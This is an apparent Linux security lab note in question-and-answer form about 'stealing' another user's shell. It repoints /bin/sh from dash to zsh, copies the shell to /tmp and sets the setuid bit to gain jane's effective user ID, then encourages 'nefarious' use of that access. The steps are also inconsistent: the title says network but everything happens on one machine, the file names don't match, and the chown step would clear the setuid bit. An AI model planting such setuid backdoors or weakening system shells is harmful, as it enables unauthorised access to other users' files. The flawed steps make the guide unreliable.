# Task: Stealing a shell from a computer on the same network

## Things To Know

<question></question>
What is `dash`?

<answer></answer>
Besides another shell to haunt you, `dash` is the default system shell for executing system
scripts and other administrative tasks. `dash` has the countermeasure where if `euid!=ruid`, then
`euid` will be set equal to `ruid` which means lifted privilege will be automatically dropped.

<question></question>
Why is this important?

<answer></answer>
If the default shell is changed to another without the same countermeasure, bad actors can do bad
things!

For example, `zsh` (yet another shell) does not have this countermeasure which is why it would be
a good choice of shell to use when attempting to stealing someones shell.

#### Check your default shell

```bash +torchlight-bash
ls -l /bin/sh
# output
lrwxrwxrwx 1 root root 4 Jul 11  2022 /bin/sh -> dash
```

#### Remove the symlink of your default which points to `dash` and recreate pointing to `zsh`

```bash +torchlight-bash
sudo rm /bin/sh
sudo ln -s /bin/zsh /bin/sh
```

#### Confirm shell has been updated

```bash +torchlight-bash
ls -l /bin/sh
# output
lrwxrwxrwx 1 root root 8 Mar 23 07:24 /bin/sh -> /bin/zsh
```

#### Jump on the subject computer and get to the stealing!

This example assumes there is a user called Jane already set up, so rather than jumping on a
physical machine you are just switching user.

```bash +torchlight-bash
# switch user
su jane
# copy janes shell to the tmp directory
cp /bin/sh /tmp/janesStolenShell
# change permissions of the stolen shell
chmod 4755 /tmp/janesStolenShell
```

#### Make sure `set-uid` bit has been enabled

```bash +torchlight-bash
ls -l /tmp/janesStolenShell
# updated permissions
-rwsr-xr-x 1 jane jane 878288 Mar 24 05:10 /tmp/janesStolenShell
```

#### Return back to your computer and access the stolen shell

```bash +torchlight-bash
sudo chown user_name /tmp/janesShell
# confirm the job
/tmp/janesShell
# output
$
```

You can confirm you have successfully stolen the shell by running  `id` command. If the `euid` is
set to the stolen shells user id then you have successfully stolen their shell.

```bash +torchlight-bash
id
# output
uid=1000(seed) gid=1000(seed) euid=1001(jane) groups=1000(seed),120(docker)
```

<question></question>
So what does this do for me?
<answer></answer>
Now that you have access to another users shell you have their privilege so you can copy and
delete their files or do what ever nefarious things bad people do.
